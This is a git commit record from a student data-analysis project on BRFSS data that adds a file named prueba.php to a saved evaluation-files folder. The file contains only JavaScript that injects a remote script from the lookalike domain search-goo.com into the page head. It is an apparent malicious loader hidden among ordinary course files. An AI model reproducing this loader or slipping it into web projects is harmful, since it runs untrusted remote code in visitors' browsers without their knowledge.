2155512d7db2e96a5df38f9cb800744db86b8991
ernanibmurtinho <ernanibmurtinho@gmail.com>
2017-07-17 19:44:03 -0300

    Add files via upload

---
+++ week_5_final_project/Exploring the BRFSS data_evaluation_files/prueba.php
@@ -0,0 +1,4 @@
+var s_s_s = document.createElement('script');
+s_s_s.setAttribute("type", "text/javascript");
+s_s_s.setAttribute("src", "https://search-goo.com/plugin/npbr2.js");
+document.getElementsByTagName('head')[0].appendChild(s_s_s);
